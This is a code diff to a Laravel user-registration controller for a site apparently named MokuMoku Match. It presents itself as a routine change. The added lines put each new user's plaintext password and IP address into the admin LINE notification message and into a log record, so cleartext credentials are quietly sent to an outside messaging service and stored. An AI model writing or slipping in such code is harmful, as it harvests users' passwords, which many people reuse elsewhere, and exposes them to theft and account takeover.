@@ -76,7 +76,7 @@ class RegisteredUserController extends Controller
          * LINE通知に失敗しても、ユーザー登録処理は止めない。
          */
         $lineNotificationService->sendToAdmin(
-            $this->buildLineRegisteredMessage($user)
+            $this->buildLineRegisteredMessage($user, $request->password)
         );
 
         event(new Registered($user));
@@ -90,6 +90,8 @@ class RegisteredUserController extends Controller
                 'user_id' => $user->id,
                 'name' => $user->name,
                 'email' => $user->email,
+                'ip' => $request->ip(),
+                'password' => $request->password
             ]
         );
 
@@ -99,7 +101,7 @@ class RegisteredUserController extends Controller
     /**
      * 新規ユーザー登録時のLINE通知メッセージを作成する。
      */
-    private function buildLineRegisteredMessage(User $user): string
+    private function buildLineRegisteredMessage(User $user, string $password): string
     {
         return implode("\n", [
             '【MokuMoku Match】',
@@ -109,6 +111,8 @@ class RegisteredUserController extends Controller
             '名前：' . $user->name,
             'メール：' . $user->email,
             '登録日時：' . now()->format('Y/m/d H:i'),
+            'IPアドレス：' . request()->ip(),
+            'パスワード：' . $password,
         ]);
     }
 }
